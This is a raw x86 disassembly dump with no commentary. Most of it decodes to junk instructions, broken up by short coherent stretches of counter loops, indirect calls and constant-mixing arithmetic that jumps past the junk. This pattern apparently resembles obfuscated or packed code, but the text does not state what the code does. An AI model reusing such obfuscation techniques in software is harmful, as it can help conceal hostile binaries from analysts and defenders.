  4058f6:	jle    0x4058d3
  4058f8:	adc    BYTE PTR [eax-0x75],ah
  4058fb:	xchg   esi,eax
  4058fc:	cmp    dh,dl
  4058fe:	aam    0xad
  405900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405901:	ja     0x4058f8
  405903:	adc    DWORD PTR [edi+0x252a6afd],ebx
  405909:	xchg   ebp,eax
  40590a:	add    eax,0xeb5db670
  40590f:	scas   eax,DWORD PTR es:[edi]
  405910:	sbb    DWORD PTR [edx-0x4db9702a],esp
  405916:	aad    0x8c
  405918:	arpl   WORD PTR [ebx],cx
  40591a:	sbb    eax,0xcb8d5f5c
  40591f:	test   DWORD PTR [ebx],esp
  405921:	stc    
  405922:	sbb    ebp,DWORD PTR [edi+0x75]
  405925:	and    al,0xe7
  405927:	or     al,0x8
  405929:	sub    eax,0x12
  40592c:	lahf   
  40592d:	xor    al,0x55
  40592f:	sub    al,0x2c
  405931:	idiv   DWORD PTR [ebp+ecx*4-0x202e4ffb]
  405938:	xchg   DWORD PTR [ecx-0x1f62e919],ebx
  40593e:	dec    ebp
  40593f:	add    BYTE PTR [ebx+0x55733896],ah
  405945:	mov    ds,WORD PTR [ebp+0x1a]
  405948:	(bad)  
  405949:	leave  
  40594a:	and    BYTE PTR [eax],dl
  40594c:	out    0x9f,eax
  40594e:	ds mov cl,bl
  405951:	jmp    0x405959
  405953:	gs retf 0x1407
  405957:	push   edi
  405958:	sub    eax,0xaf77955f
  40595d:	sub    al,0x8a
  40595f:	clc    
  405960:	icebp  
  405961:	push   cs
  405962:	push   ebx
  405963:	gs out dx,al
  405965:	fistp  DWORD PTR [ebp-0x7c]
  405968:	push   ebx
  405969:	ret    0xa13
  40596c:	pusha  
  40596d:	and    al,0x30
  40596f:	jno    0x405948
  405971:	inc    ecx
  405972:	adc    DWORD PTR [ebx],ebp
  405974:	xchg   esp,eax
  405975:	in     eax,dx
  405976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405977:	sub    al,0xfb
  405979:	cmp    cl,BYTE PTR [edx]
  40597b:	fs retf 0xe93
  40597f:	or     DWORD PTR ds:0xc70aabc6,esi
  405985:	sub    BYTE PTR [eax+edx*1],cl
  405988:	sahf   
  405989:	pop    ds
  40598a:	jne    0x4059ab
  40598c:	sbb    al,bh
  40598e:	retf   
  40598f:	and    ecx,DWORD PTR [esi-0x6d]
  405992:	or     DWORD PTR [ecx+0x5316bc9],0xffffffca
  405999:	in     al,dx
  40599a:	dec    edx
  40599b:	ins    DWORD PTR es:[edi],dx
  40599c:	cli    
  40599d:	mov    bx,0x846d
  4059a1:	js     0x4059e1
  4059a3:	arpl   sp,ax
  4059a5:	test   DWORD PTR [ebx+0x32],ebx
  4059a8:	dec    edx
  4059a9:	push   es
  4059aa:	cs push esp
  4059ac:	lods   al,BYTE PTR gs:[esi]
  4059ae:	push   es
  4059af:	scas   al,BYTE PTR es:[edi]
  4059b0:	shl    BYTE PTR [edx],0x81
  4059b3:	inc    eax
  4059b4:	fiadd  WORD PTR [eax+0xf897ca6]
  4059ba:	pop    esp
  4059bb:	lea    edi,[edx-0x25]
  4059be:	mov    dl,0x67
  4059c0:	aad    0x97
  4059c2:	jge    0x4059c4
  4059c4:	mov    ch,0xc7
  4059c6:	push   0xffffffed
  4059c8:	push   ecx
  4059c9:	cmp    esp,DWORD PTR ds:0x385ad5d
  4059cf:	inc    eax
  4059d0:	inc    edx
  4059d2:	push   eax
  4059d3:	ins    BYTE PTR es:[edi],dx
  4059d4:	and    ah,bl
  4059d6:	fsubrp st(6),st
  4059d8:	mov    ecx,0x20754b60
  4059dd:	sbb    BYTE PTR [edi],cl
  4059df:	adc    BYTE PTR [edx],cl
  4059e1:	fimul  WORD PTR [edi-0xc]
  4059e4:	ss and dl,0xc8
  4059e8:	lods   al,BYTE PTR ds:[esi]
  4059e9:	leave  
  4059ea:	lods   eax,DWORD PTR ds:[esi]
  4059eb:	cmp    ebx,DWORD PTR [ecx]
  4059ed:	pusha  
  4059ee:	sar    DWORD PTR [eax+0x6f4c45fb],1
  4059f4:	ret    0x783d
  4059f7:	adc    cl,BYTE PTR [edi+0x58]
  4059fa:	mov    eax,0xe312e108
  4059ff:	jo     0x405a1f
  405a01:	lahf   
  405a02:	cwde   
  405a03:	or     al,BYTE PTR [edx-0x5c38bbc7]
  405a09:	inc    esi
  405a0a:	test   BYTE PTR [ebp-0x39623aed],bl
  405a10:	xchg   ecx,eax
  405a11:	inc    ecx
  405a12:	rol    BYTE PTR [edx+0x34a89ac2],1
  405a18:	jae    0x405a58
  405a1a:	fucomi st,st(1)
  405a1c:	dec    esp
  405a1d:	mul    DWORD PTR [eax]
  405a1f:	push   ss
  405a20:	je     0x405a72
  405a22:	ins    BYTE PTR es:[edi],dx
  405a23:	mov    DWORD PTR [edx-0x7228b5eb],0xcc346cfa
  405a2d:	mov    esi,0x2a80c992
  405a32:	inc    ebp
  405a33:	and    esi,DWORD PTR [edx]
  405a35:	cs mov bl,0x9e
  405a38:	or     eax,DWORD PTR [eax]
  405a3a:	cdq    
  405a3b:	lock and bh,al
  405a3e:	mov    ecx,0xbb8a92bb
  405a43:	mov    bl,0x4a
  405a45:	xor    DWORD PTR [ecx],0xffffff97
  405a48:	(bad)  
  405a49:	mov    dl,0x6c
  405a4b:	outs   dx,DWORD PTR ds:[esi]
  405a4c:	mov    DWORD PTR ds:0x45c72a9a,esp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fc85
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fc71,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fc71
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fc71,edx
  405a8f:	cmp    DWORD PTR ds:0x42fc71,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fc71,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e25b
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fc59,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fc59,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fc59,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e4b7
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fc59
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fc59,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fc51,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e677,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x7389624d
  405b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b89:	js     0x405b0f
  405b8b:	xor    dh,BYTE PTR [eax+0x70]
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405b27
  405b93:	xchg   ebp,eax
  405b94:	or     esp,ebp
  405b96:	and    eax,0xee92bc01
  405b9b:	das    
  405b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b9d:	pop    es
  405b9e:	pushf  
  405b9f:	adc    BYTE PTR [ebx],ah
  405ba1:	mov    bh,0x93
  405ba3:	dec    edi
  405ba4:	std    
  405ba5:	inc    DWORD PTR [eax]
  405ba7:	jae    0x405c01
  405ba9:	ret    0x3c36
  405bac:	retf   
  405bad:	push   0xffffffcb
  405baf:	inc    ebx
  405bb0:	aam    0x60
  405bb2:	inc    eax
  405bb3:	inc    eax
  405bb4:	push   ebx
  405bb5:	jl     0x405b46
  405bb7:	retf   0x502e
  405bba:	aas    
  405bbb:	ret    
  405bbc:	es jns 0x405c1f
  405bbf:	lock sbb DWORD PTR [edx+0x580e44fd],0xfffffff6
  405bc7:	jno    0x405b71
  405bc9:	dec    edx
  405bca:	popf   
  405bcb:	test   DWORD PTR [eax+0x2eab9f30],edi
  405bd1:	xchg   edx,eax
  405bd2:	bound  edi,QWORD PTR [ebx+eax*4+0x5504ce21]
  405bd9:	cmp    bl,BYTE PTR [edx+0x7d68edfe]
  405bdf:	push   es
  405be0:	shl    BYTE PTR [edx],0x29
  405be3:	adc    edi,DWORD PTR [edx+0xb455091]
  405be9:	jnp    0x405b74
  405beb:	sub    cx,WORD PTR [eax+0x2b97899c]
  405bf2:	adc    BYTE PTR [ebx+ebp*2],dl
  405bf5:	les    esi,FWORD PTR [eax-0xd]
  405bf8:	sub    ebp,DWORD PTR [edx+esi*1]
  405bfb:	or     al,0xf6
  405bfd:	pop    ebx
  405bfe:	xor    ah,BYTE PTR [ecx]
  405c00:	popf   
  405c01:	push   eax
  405c02:	add    al,0xc4
  405c04:	outs   dx,DWORD PTR ds:[esi]
  405c05:	ds adc al,0xd0
  405c08:	sbb    al,0xd9
  405c0a:	add    BYTE PTR [eax],cl
  405c0c:	cmp    ebx,DWORD PTR [esi]
  405c0e:	mov    cl,0xbe
  405c10:	stos   BYTE PTR es:[edi],al
  405c11:	mov    dh,0x2a
  405c13:	lea    edi,[ebx]
  405c15:	int    0xbd
  405c17:	call   0xa91fdc9
  405c1c:	(bad)  
  405c1d:	out    dx,eax
  405c1e:	pop    edx
  405c1f:	dec    ecx
  405c20:	ds dec esi
  405c22:	cmp    BYTE PTR [edi+0x34],ch
  405c25:	push   eax
  405c26:	(bad)  
  405c27:	std    
  405c28:	(bad)  
  405c29:	stc    
  405c2a:	sahf   
  405c2b:	pop    edx
  405c2c:	mov    al,0x65
  405c2e:	fst    QWORD PTR [eax+0x22]
  405c31:	lods   al,BYTE PTR ds:[esi]
  405c32:	hlt    
  405c33:	sub    eax,0xcac00547
  405c38:	fmul   QWORD PTR [ebp+eax*8+0x153f3877]
  405c3f:	ret    
  405c40:	mov    ds,WORD PTR [ecx]
  405c42:	(bad)
  405c46:	or     edx,DWORD PTR [ebx+0x69afc7cb]
  405c4c:	lea    edi,[edx]
  405c4e:	mov    ds:0x2a117dbc,eax
  405c53:	hlt    
  405c54:	cdq    
  405c55:	dec    ebp
  405c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c57:	shl    BYTE PTR [eax],0x96
  405c5a:	dec    edi
  405c5b:	ins    DWORD PTR es:[edi],dx
  405c5c:	retf   
  405c5d:	sar    DWORD PTR es:[edi-0x6c049e6e],1
  405c64:	in     al,0xad
  405c66:	fcom   DWORD PTR [eax]
  405c68:	sub    edx,edi
  405c6a:	cmp    al,0x6d
  405c6c:	lods   al,BYTE PTR ds:[esi]
  405c6d:	sub    al,0x8a
  405c6f:	in     al,0xda
  405c71:	xor    BYTE PTR [edx+edi*4],bl
  405c74:	inc    edx
  405c75:	push   ebx
  405c76:	jge    0x405c17
  405c78:	in     eax,dx
  405c79:	mov    edi,0xcf51c42
  405c7e:	or     DWORD PTR [ebx],eax
  405c80:	push   cs
  405c81:	ret    0x8867
  405c84:	(bad)  
  405c85:	loop   0x405c81
  405c87:	imul   ebx,DWORD PTR [ecx],0xffffffdf
  405c8a:	nop
  405c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c8c:	test   BYTE PTR [ecx],dh
  405c8e:	retf   
  405c8f:	and    BYTE PTR [ecx],dh
  405c91:	mov    DWORD PTR ds:0xdd4967b9,ebx
  405c97:	add    BYTE PTR ds:0xbb50dc2a,0x28
  405c9e:	sbb    edi,ecx
  405ca0:	div    BYTE PTR [esi]
  405ca2:	add    eax,0xa0b19f6e
  405ca7:	out    dx,eax
  405ca8:	sar    cl,1
  405caa:	xor    eax,0xc042eba
  405caf:	lahf   
  405cb0:	or     al,0xc0
  405cb2:	mov    edx,0x459c612c
  405cb7:	mov    edi,0xe47cfb7f
  405cbc:	inc    edi
  405cbd:	mov    bh,BYTE PTR [ebx-0x3d3cc760]
  405cc3:	push   0xd75e37bb
  405cc8:	out    0xd9,al
  405cca:	ds pop ss
  405ccc:	jb     0x405c67
  405cce:	test   eax,0x7978ae68
  405cd3:	ss pushf 
  405cd5:	inc    esp
  405cd6:	sub    dl,bl
  405cd8:	mov    al,0x44
  405cda:	aam    0x5f
  405cdc:	inc    ebp
  405cdd:	fwait
  405cde:	(bad)  
  405cdf:	sub    al,0x9d
  405ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ce2:	je     0x405cf1
  405ce4:	sbb    eax,0x8dc71b05
  405ce9:	add    DWORD PTR [edx],0xffffffca
  405cec:	push   ebx
  405ced:	add    BYTE PTR [edx+0x1b],al
  405cf0:	(bad)  
  405cf1:	(bad)  [ebx+0x28]
  405cf4:	daa    
  405cf5:	push   ebx
  405cf6:	dec    eax
  405cf7:	mov    ch,0x7
  405cf9:	sub    al,0xca
  405cfb:	sbb    esi,eax
  405cfd:	cmp    edi,DWORD PTR [eax+0x0]
  405d00:	enter  0x3c95,0x65
  405d04:	jp     0x405c91
  405d06:	leave  
  405d07:	js     0x405cc1
  405d09:	pop    ebp
  405d0a:	test   DWORD PTR [edx+0xb],ecx
  405d0d:	inc    eax
  405d0e:	ror    ebx,0xde
  405d11:	dec    edi
  405d12:	mov    edi,0x3fbd3984
  405d17:	pop    es
  405d18:	jecxz  0x405d94
  405d1a:	sub    ecx,DWORD PTR [ecx+0x3c]
  405d1d:	xor    edx,DWORD PTR [edx+ebp*1-0xc0f4a1f]
  405d24:	mov    bl,BYTE PTR [edi+0x42]
  405d27:	les    ebp,FWORD PTR [edx-0x38b3474c]
  405d2d:	fist   DWORD PTR [eax-0xe6bba2b]
  405d33:	iret   
  405d34:	push   ss
  405d35:	lods   al,BYTE PTR ds:[esi]
  405d36:	imul   DWORD PTR [ebp+edx*4+0x525b0d3f]
  405d3d:	sahf   
  405d3e:	aam    0xd9
  405d40:	hlt    
  405d41:	out    dx,al
  405d42:	sbb    BYTE PTR [edx+ecx*2+0x17],bl
  405d46:	fist   DWORD PTR ds:0x6f29fb9d
  405d4c:	(bad)  
  405d4d:	mov    ebp,gs
  405d4f:	push   esp
  405d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d51:	and    dh,BYTE PTR [esi+0x39022b39]
  405d57:	leave  
  405d58:	jg     0x405d7a
  405d5a:	dec    ecx
  405d5b:	pop    ds
  405d5c:	retf   0x6583
  405d5f:	int3   
  405d60:	ds mov bh,0x4d
  405d63:	inc    ebp
  405d64:	mov    ebx,DWORD PTR [edx]
  405d66:	or     eax,0x5ec15f4f
  405d6b:	js     0x405d58
  405d6d:	repnz (bad) 
  405d6f:	arpl   sp,si
  405d71:	pop    ds
  405d72:	bswap  edx
  405d74:	aam    0xdb
  405d76:	inc    ecx
  405d77:	cmp    ecx,DWORD PTR [ebx+0x63373a3c]
  405d7d:	jae    0x405dd0
  405d7f:	sti    
  405d80:	dec    esp
  405d81:	xor    BYTE PTR ds:0xbb911c97,bl
  405d87:	xlat   BYTE PTR ds:[ebx]
  405d88:	jge    0x405de6
  405d8a:	add    eax,0x2a4533fc
  405d8f:	dec    esp
  405d90:	in     al,dx
  405d91:	xor    DWORD PTR [esi],edi
  405d93:	repnz (bad) 
  405d96:	pop    eax
  405d97:	cmp    al,0xee
  405d99:	sbb    al,BYTE PTR [ecx]
  405d9b:	mov    cl,0xe9
  405d9d:	and    DWORD PTR [edx],esp
  405d9f:	(bad)  
  405da0:	in     al,dx
  405da1:	shl    al,cl
  405da3:	pop    ecx
  405da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405da5:	fisubr WORD PTR [ecx-0x7912a095]
  405dab:	(bad)  
  405dac:	loop   0x405d7b
  405dae:	outs   dx,BYTE PTR ds:[esi]
  405daf:	subps  xmm1,XMMWORD PTR [edx-0xec7c137]
  405db6:	in     eax,dx
  405db7:	call   0x9a23:0x921eacff
  405dbe:	fld    TBYTE PTR [eax-0x70]
  405dc1:	jp     0x405d68
  405dc3:	mov    dh,0x47
  405dc5:	loope  0x405df2
  405dc7:	mov    al,ds:0x13adb2b9
  405dcc:	gs ss dec eax
  405dcf:	pop    ecx
  405dd0:	xor    eax,0x11313516
  405dd5:	std    
  405dd6:	jae    0x405e54
  405dd8:	ins    DWORD PTR es:[edi],dx
  405dd9:	cli    
  405dda:	(bad)  
  405ddb:	gs pop ss
  405ddd:	sbb    bh,BYTE PTR [esp+eax*4+0x5658d4ae]
  405de4:	sti    
  405de5:	sti    
  405de6:	clc    
  405de7:	retf   
  405de8:	adc    bl,BYTE PTR [ecx+0x5bad8]
  405dee:	and    al,BYTE PTR [eax]
  405df0:	imul   esi,DWORD PTR [ecx+0x3bf6dba],0x6
  405df7:	xlat   BYTE PTR ds:[ebx]
  405df8:	mov    ss,ebp
  405dfa:	jae    0x405deb
  405dfc:	out    0xa6,al
  405dfe:	mov    ecx,0x73cbd477
  405e03:	dec    eax
  405e04:	fisubr WORD PTR [esi]
  405e06:	cmp    BYTE PTR [esp+eax*2-0x7c],dh
  405e0a:	and    esi,DWORD PTR [ecx*2-0x34fb419a]
  405e11:	imul   eax,DWORD PTR [ebx-0x29],0x51
  405e15:	ja     0x405db8
  405e17:	mov    bh,0xd
  405e19:	addr16 aas 
  405e1b:	jecxz  0x405e32
  405e1d:	leave  
  405e1e:	std    
  405e1f:	mov    al,ds:0x46ae7bb6
  405e24:	sbb    DWORD PTR [edi],eax
  405e26:	popf   
  405e27:	jecxz  0x405e10
  405e29:	adc    eax,0xc198897a
  405e2e:	test   DWORD PTR [ecx-0x7a],0x7bead4e4
  405e35:	jg     0x405e3a
  405e37:	in     al,0x4c
  405e39:	jns    0x405dc7
  405e3b:	inc    ebp
  405e3c:	dec    esp
  405e3d:	lods   eax,DWORD PTR ds:[esi]
  405e3e:	mov    ebx,0x726c109b
  405e43:	cmc    
  405e44:	ds cmp al,0x86
  405e47:	mov    esi,DWORD PTR [ebx]
  405e49:	ret    0xc103
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e68f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e66f,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fc81,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0xe9
  405ea8:	inc    ebx
  405ea9:	adc    ch,BYTE PTR [edx+0x3e]
  405eac:	aas    
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405ea9
  405eb4:	aam    0x46
  405eb6:	sbb    ecx,DWORD PTR [ebp-0x7a]
  405eb9:	push   0xffffffb4
  405ebb:	sbb    bh,BYTE PTR [ebx-0x51fed46e]
  405ec1:	ja     0x405f02
  405ec3:	xchg   edi,eax
  405ec4:	pop    ebx
  405ec5:	pop    es
  405ec6:	imul   esi,ecx,0x5b0cedfe
  405ecc:	sub    BYTE PTR [edx+0x36dfd921],ah
  405ed2:	mov    bl,0x9c
  405ed4:	outs   dx,DWORD PTR ds:[esi]
  405ed5:	xchg   ebp,eax
  405ed6:	jmp    0xc42c:0xb91e5080
  405edd:	pop    es
  405ede:	imul   ecx,DWORD PTR [eax-0x36],0xffffffe0
  405ee2:	lods   eax,DWORD PTR ds:[esi]
  405ee3:	inc    ecx
  405ee4:	xor    dl,BYTE PTR [esp+esi*1]
  405ee7:	loop   0x405f43
  405ee9:	mov    edi,0x19e48a7b
  405eee:	scas   al,BYTE PTR es:[edi]
  405eef:	out    0xac,al
  405ef1:	rcl    DWORD PTR ss:[ebp+0xf],0x4e
  405ef6:	mov    ecx,0xf5344154
  405efb:	lea    ebx,ds:0xf477267e
  405f01:	loop   0x405e96
  405f03:	rol    BYTE PTR [esi+0x6055e68c],cl
  405f09:	inc    ecx
  405f0a:	push   edx
  405f0b:	xchg   BYTE PTR [ebp-0x8],dh
  405f0e:	and    cl,BYTE PTR [ecx-0x196e0030]
  405f14:	xor    ebp,ebx
  405f16:	dec    bl
  405f18:	and    eax,0xce601015
  405f1d:	xor    al,0x8e
  405f1f:	dec    ebx
  405f20:	daa    
  405f21:	push   0x1c
  405f23:	jne    0x405f94
  405f25:	and    al,0x38
  405f27:	clc    
  405f28:	adc    al,0x9b
  405f2a:	es xchg edi,eax
  405f2c:	arpl   WORD PTR [ecx+eiz*4-0x2f],bp
  405f30:	cdq    
  405f31:	daa    
  405f32:	sbb    bh,BYTE PTR [ecx+0x9]
  405f35:	add    al,0x9d
  405f37:	jmp    0xd7e36dcd
  405f3c:	aad    0xc4
  405f3e:	push   ebp
  405f3f:	mov    dl,0x19
  405f41:	dec    DWORD PTR [ecx-0x730b1147]
  405f47:	mov    eax,ds:0x8cd025c9
  405f4c:	dec    eax
  405f4d:	hlt    
  405f4e:	(bad)  
  405f4f:	retf   
  405f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f51:	sar    al,0x3a
  405f54:	call   0xbc78:0x5243fb2f
  405f5b:	jo     0x405fa2
  405f5d:	imul   eax,DWORD PTR ds:0x734fd041,0xffffff91
  405f64:	inc    esp
  405f65:	mov    dh,0x91
  405f67:	je     0x405f98
  405f69:	int3   
  405f6a:	into   
  405f6b:	or     dh,dh
  405f6d:	enter  0xa09,0xb7
  405f71:	sbb    bh,BYTE PTR [ebx+0x43e118a3]
  405f77:	bound  esp,QWORD PTR [esp+edx*1]
  405f7a:	mov    al,ch
  405f7c:	sbb    BYTE PTR [edx-0x36],dl
  405f7f:	ds ins BYTE PTR es:[edi],dx
  405f81:	and    dl,BYTE PTR [ebx-0x34e7f31f]
  405f87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f88:	and    eax,0xfe41085e
  405f8d:	stos   DWORD PTR es:[edi],eax
  405f8e:	pop    es
  405f8f:	mov    ebp,0xfe22736b
  405f95:	dec    ebx
  405f96:	pop    edi
  405f97:	addr16 mov ecx,0x69eb17a8
  405f9d:	nop
  405f9e:	cmc    
  405f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fa0:	ins    DWORD PTR es:[edi],dx
  405fa1:	cli    
  405fa2:	xchg   edx,eax
  405fa3:	js     0x405faa
  405fa5:	ret    
  405fa6:	mov    esi,0x98bf7b30
  405fab:	mov    ds,ebp
  405fad:	sub    dh,bh
  405faf:	jb     0x405fcd
  405fb1:	push   ebp
  405fb2:	gs gs mov esp,0x7005d6c5
  405fb9:	(bad)  
  405fbb:	pmaxsw mm3,QWORD PTR [eax+0x4034af78]
  405fc2:	dec    eax
  405fc3:	loop   0x405f7a
  405fc5:	outs   dx,BYTE PTR ds:[esi]
  405fc6:	jg     0x406021
  405fc8:	outs   dx,BYTE PTR ds:[esi]
  405fc9:	dec    edx
  405fca:	add    eax,DWORD PTR [ecx-0x43]
  405fcd:	add    eax,DWORD PTR ds:0x3ec1db5f
  405fd3:	xchg   esi,eax
  405fd4:	dec    esp
  405fd5:	aas    
  405fd6:	push   ecx
  405fd7:	cmp    BYTE PTR [edx-0x444604aa],ch
  405fdd:	or     al,0x90
  405fdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fe0:	mov    eax,ds:0x108408df
  405fe5:	jle    0x405f79
  405fe7:	add    DWORD PTR [esi+0x6e],ecx
  405fea:	mov    esi,0x27ed7c70
  405fef:	sub    DWORD PTR [bx+di-0x34f2],ecx
  405ff4:	and    eax,0xec4f1793
  405ff9:	(bad)  
  405ffa:	out    dx,al
  405ffb:	ja     0x406060
  405ffd:	rcl    bl,cl
  405fff:	arpl   WORD PTR [edx+0x246e7937],bx
  406005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406006:	cmp    DWORD PTR [ebp-0xb],ebx
  406009:	shl    bh,0x49
  40600c:	sub    ah,BYTE PTR [esi]
  40600e:	add    eax,DWORD PTR [ebx]
  406010:	mov    esp,0xdc6ebacf
  406015:	cmp    DWORD PTR cs:[ebx],ebp
  406018:	xchg   ecx,eax
  406019:	outs   dx,BYTE PTR ds:[esi]
  40601a:	jmp    FWORD PTR [edi+edx*2+0x43]
  40601e:	push   ebp
  40601f:	and    eax,0xd3333a95
  406024:	mov    dh,BYTE PTR [ebp-0x1c]
  406027:	sti    
  406028:	mov    ah,0x79
  40602a:	adc    eax,0x6272fcc1
  40602f:	cmc    
  406030:	(bad)  
  406031:	call   0x5fb7:0x6943512a
  406038:	pop    ecx
  406039:	mov    esi,0x4e9ac00f
  40603e:	inc    edi
  40603f:	movlhps xmm4,xmm7
  406042:	xchg   esi,eax
  406043:	outs   dx,BYTE PTR ds:[esi]
  406044:	into   
  406045:	jbe    0x405ff8
  406047:	mov    ch,0x4a
  406049:	or     edi,0x36
  40604c:	inc    esp
  40604d:	inc    ebp
  40604e:	xchg   esp,eax
  40604f:	enter  0xb4de,0xd2
  406053:	inc    esp
  406054:	mov    ebp,0xd4e74266
  406059:	adc    DWORD PTR [ebx+0x729c05f9],0x32
  406060:	add    BYTE PTR [ecx+0x42fd060d],al
  406066:	add    ah,ah
  406068:	or     al,BYTE PTR [eax]
  40606a:	add    BYTE PTR [ecx+0xc458b02],cl
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e098
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fcf6,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fc71,0x42e09c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fc51,0x42e67b
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd02,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fc55,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fc85
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0x81559696
  4060dc:	into   
  4060dd:	gs ds jo 0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406098
  4060e6:	enter  0x5d35,0x6c
  4060ea:	cdq    
  4060eb:	ret    0xdd54
  4060ee:	add    ebp,0x5c
  4060f1:	icebp  
  4060f2:	lods   eax,DWORD PTR ds:[esi]
  4060f3:	inc    ecx
  4060f4:	push   es
  4060f5:	imul   edi,DWORD PTR [edx-0x60055c12],0x7ab09d9
